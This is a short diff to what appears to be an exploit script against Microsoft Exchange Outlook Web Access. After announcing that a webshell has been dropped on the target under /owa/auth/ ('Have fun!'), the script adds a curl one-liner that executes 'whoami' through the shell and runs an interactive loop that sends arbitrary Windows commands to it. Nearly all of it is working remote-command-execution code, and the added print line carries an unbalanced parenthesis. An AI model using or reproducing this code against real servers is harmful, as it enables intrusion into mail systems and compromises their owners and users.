@@ -174,10 +174,11 @@ if ct.status_code != 200:
     print("Write Shell Error!")
     exit()
 print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
+print('(+) Enjoy your shell: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name)))
 time.sleep(2)
 while True:
 	cmd = input('CMD: ')
-	shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'''%cmd
+	shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
 	shell_req = requests.post('https://%s/owa/auth/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
 	print(shell_req.text.split('Name                            :')[0])
-#https://www.youtube.com/watch?v=mvbAHxm4Nxg
+
